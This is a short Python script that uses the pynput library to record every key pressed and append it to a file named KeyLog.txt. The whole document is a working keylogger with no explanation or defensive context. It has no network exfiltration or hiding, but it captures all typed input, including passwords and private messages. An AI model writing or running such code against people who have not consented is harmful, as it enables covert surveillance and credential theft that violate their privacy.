from pynput.keyboard import Listener

def write_logs(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    
    with open ("KeyLog.txt","a") as file:
        file.write (keydata)
        
with Listener (on_press = write_logs) as listen :
    listen.join()